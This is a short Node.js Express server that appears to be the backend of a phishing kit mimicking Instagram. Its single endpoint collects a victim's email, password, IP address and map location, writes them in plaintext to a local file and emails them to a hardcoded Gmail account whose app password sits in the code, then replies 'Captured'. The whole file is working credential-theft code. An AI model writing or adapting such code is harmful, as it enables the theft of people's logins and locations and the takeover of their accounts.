const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());

app.post('/send-login', async (req, res) => {
  const { email, password, ip, lat, lng } = req.body;

  const location = (lat && lng)
    ? `https://www.google.com/maps?q=${lat},${lng}`
    : 'Location access denied or unavailable';

  const log = `
Email: ${email}
Password: ${password}
IP: ${ip}
Location: ${location}
Time: ${new Date().toLocaleString()}
--------------------------
`;

  // Save to file
  fs.appendFile('logins.txt', log, err => {
    if (err) console.error('Error writing to file:', err);
  });

  // Send Email
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'iamuser009999@gmail.com',
      pass: 'dmbqxkjzpjlkrfjy'
    }
  });

  const mailOptions = {
    from: 'iamuser009999@gmail.com',
    to: 'iamuser009999@gmail.com',
    subject: 'Instagram Clone Login Info',
    text: log
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Captured' });
  } catch (err) {
    console.error('Email error:', err);
    res.status(500).json({ message: 'Failed to send email' });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
});


